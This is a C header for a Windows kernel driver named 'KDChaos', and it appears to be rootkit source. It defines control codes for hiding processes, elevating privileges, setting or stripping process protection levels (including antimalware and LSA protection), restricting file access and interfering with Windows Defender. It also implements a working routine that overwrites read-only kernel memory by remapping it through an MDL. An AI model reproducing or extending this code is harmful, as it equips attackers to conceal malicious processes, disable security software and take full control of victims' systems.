#pragma once
#include <ntifs.h>
#include <ntdef.h>
#include <minwindef.h>
#include <ntstrsafe.h>
#include <wdm.h>
#include <fltkernel.h>
#include <ntddk.h>


#define HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN,0x45,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PRIVILEGE_ELEVATION CTL_CODE(FILE_DEVICE_UNKNOWN,0x90,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_SYSTEM CTL_CODE(FILE_DEVICE_UNKNOWN,0x91,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINTCB CTL_CODE(FILE_DEVICE_UNKNOWN,0x92,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINDOWS CTL_CODE(FILE_DEVICE_UNKNOWN,0x93,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_AUTHENTICODE CTL_CODE(FILE_DEVICE_UNKNOWN,0x94,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINTCB_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x95,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINDOWS_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x96,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_LSA_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x97,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_ANTIMALWARE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x98,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_AUTHENTICODE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x99,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define UNPROTECT_ALL_PROCESSES CTL_CODE(FILE_DEVICE_UNKNOWN,0x100,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define RESTRICT_ACCESS_TO_FILE_CTL CTL_CODE(FILE_DEVICE_UNKNOWN,0x169,METHOD_BUFFERED ,FILE_ANY_ACCESS)
#define TROLL_DEFENDER CTL_CODE(FILE_DEVICE_UNKNOWN,0x1645,METHOD_BUFFERED ,FILE_ANY_ACCESS)

UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\KDChaos");

UNICODE_STRING SymbName = RTL_CONSTANT_STRING(L"\\??\\KDChaos");

const char* PsGetProcessImageFileName(PEPROCESS Process);

EX_PUSH_LOCK pLock;

wchar_t* to_free;
typedef struct foperationx {
    int rpid;
    wchar_t filename[MAX_PATH];
}fopera, * Pfoperation;


DWORD write_to_read_only_memory(void* address, void* buffer, size_t size)
{
    PMDL Mdl = IoAllocateMdl(address, size, FALSE, FALSE, NULL);

    if (!Mdl)
    {
        DbgPrint("MDL cannot be allocated\n");
        return -1;
    }

    MmProbeAndLockPages(Mdl, KernelMode, IoReadAccess);

    PVOID Mapping = MmMapLockedPagesSpecifyCache(Mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
    
    if (MmProtectMdlSystemAddress(Mdl, PAGE_READWRITE) != STATUS_SUCCESS)
    {
        DbgPrint("MDL cannot be allocated\n");

        return -1;
    }

    RtlCopyMemory(Mapping, buffer, size);

    MmUnmapLockedPages(Mapping, Mdl);

    MmUnlockPages(Mdl);

    IoFreeMdl(Mdl);

    return 0;

}
